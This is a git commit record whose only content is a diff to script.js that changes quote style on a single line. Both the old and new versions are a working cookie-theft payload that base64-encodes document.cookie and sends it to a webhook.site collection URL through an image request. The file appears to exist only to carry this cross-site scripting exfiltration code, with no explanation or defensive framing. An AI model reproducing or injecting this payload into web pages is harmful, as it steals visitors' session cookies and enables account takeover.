1df96e296375bb6ce527ee4ef97aa8d4b1a687e1
amdkp2-hue <amdkp2@gmail.com>
2026-05-20 21:12:37 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,2 +1,2 @@
 var x = new Image();
-x.src="https://webhook.site/2ce0bb09-0874-4360-8fc0-4bea3e05a076/cookie?c="+btoa(document.cookie);
+x.src='https://webhook.site/2ce0bb09-0874-4360-8fc0-4bea3e05a076/cookie?c='+btoa(document.cookie);
